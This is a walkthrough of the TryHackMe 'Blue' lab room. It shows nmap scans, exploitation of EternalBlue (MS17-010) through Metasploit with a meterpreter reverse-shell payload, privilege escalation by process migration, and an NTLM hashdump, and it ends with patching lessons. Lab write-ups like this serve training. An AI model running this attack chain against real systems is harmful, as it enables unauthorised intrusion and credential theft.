#tryhackme #blue #eternalblue #ms17-010 #metasploit

# TryHackMe: Blue Room Walkthrough

**Room URL:** https://tryhackme.com/room/blue?ref=blog.tryhackme.com

**Difficulty:** Easy

**Objective:** Exploit the Windows machine vulnerable to EternalBlue (MS17-010) and retrieve three flags.

---

## Reconnaissance & Enumeration

### Initial Nmap Scan

First, I performed a port scan on the target machine to identify open ports:

```bash
nmap -p 1-999 10.10.239.14
```

**Results:**
```
Nmap scan report for 10.10.239.14
Host is up (0.13s latency).
Not shown: 996 closed tcp ports (reset)
PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
```

The target has open SMB ports (139, 445) which are typically used for Windows file sharing and could indicate a vulnerability.

---

### Vulnerability Scan

I ran a more comprehensive nmap scan with vulnerability detection scripts:

```bash
nmap -p- --script vuln 10.10.239.14
```

**Key Findings:**

```
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
49152-49160/tcp open  unknown
```

**Critical Vulnerability Detected:**

```
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs: CVE-2017-0143
|     Risk factor: HIGH
|
|     A critical remote code execution vulnerability exists in Microsoft SMBv1
|     servers (ms17-010) - also known as EternalBlue
|
|     Disclosure date: 2017-03-14
|_    References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
```

**Conclusion:** The machine is vulnerable to **EternalBlue (MS17-010)**, a critical SMB vulnerability that allows unauthenticated remote code execution.

---

## Exploitation

### Setting Up Metasploit

I launched Metasploit to exploit this vulnerability:

```bash
msfconsole
```

Then selected the EternalBlue exploit module:

```
use exploit/windows/smb/ms17_010_eternalblue
```

![Pasted image 20251119125457.png](Images/Pasted%20image%2020251119125457.png)

*Screenshot shows loading the EternalBlue exploit in Metasploit*

---

### Configuring Exploit Parameters

I configured the exploit with the necessary parameters:

- **RHOSTS** (Remote Host): 10.10.239.14 (target machine)
- **LHOST** (Local Host): My attack machine IP
- **LPORT** (Local Port): 4444
- **PAYLOAD**: windows/meterpreter/reverse_tcp (for reverse shell)

![Pasted image 20251119125612.png](Images/Pasted%20image%2020251119125612.png)

*Screenshot shows setting RHOSTS, LHOST, LPORT, and selecting the Meterpreter payload*

---

### Running the Exploit

After configuring all parameters, I executed the exploit:

```
exploit
```

The exploit successfully compromised the target machine, granting initial access with basic user privileges.

![Pasted image 20251119125838.png](Images/Pasted%20image%2020251119125838.png)

*Screenshot shows successful exploitation and initial Meterpreter shell access*

---

## Privilege Escalation

### Identifying Running Processes

To escalate privileges, I listed running processes to find a service running as SYSTEM:

```
meterpreter > ps
```

![Pasted image 20251119125912.png](Images/Pasted%20image%2020251119125912.png)

*Screenshot shows the process list. I identified services running as SYSTEM (PID values visible)*

---

### Migrating to System Process

I migrated the Meterpreter process to a SYSTEM-level process to gain administrative privileges:

```
meterpreter > migrate [SYSTEM_PID]
```

This elevated our access from user-level to SYSTEM/Administrator level.

![Pasted image 20251119130017.png](Images/Pasted%20image%20202511191300017.png)

*Screenshot shows the migration to a SYSTEM process, confirming privilege escalation*

---

### Dumping NTLM Hashes

With SYSTEM privileges, I extracted the NTLM password hashes from the Security Account Manager (SAM):

```
meterpreter > hashdump
```

![Pasted image 20251119130050.png](Images/Pasted%20image%20202511191300050.png)

*Screenshot shows dumped NTLM hashes including Administrator and Jon accounts*

The hash for the user "Jon" can be cracked using tools like:
- Crackstation (online)
- Hashcat (local GPU cracking)
- John the Ripper

---

## Flag Retrieval

With SYSTEM privileges, I was able to read all three flags:

### Flag Locations:

| Flag | Location | Path |
|---|---|---|
| Flag 1 | Root Directory | `C:\flag1.txt` |
| Flag 2 | Windows System Config | `C:\Windows\System32\config\flag2.txt` |
| Flag 3 | User Documents | `C:\Users\Jon\Documents\flag3.txt` |

I retrieved each flag by navigating to these locations using the Meterpreter shell and reading the contents of the flag files.

---

## Summary

**Attack Chain:**
1. ✅ Identified SMB services via port scanning
2. ✅ Detected EternalBlue vulnerability (MS17-010)
3. ✅ Exploited using Metasploit framework
4. ✅ Gained initial access with Meterpreter shell
5. ✅ Escalated privileges by migrating to SYSTEM process
6. ✅ Dumped NTLM hashes
7. ✅ Retrieved all three flags

**Key Vulnerabilities:**
- Microsoft SMBv1 Remote Code Execution (CVE-2017-0143)
- Lack of security patches
- Unauthenticated access to SMB services

**Lessons Learned:**
- Always patch systems, especially critical vulnerabilities like EternalBlue
- SMB should be restricted to trusted networks only
- Monitor for signs of privilege escalation
- Implement proper segmentation and access controls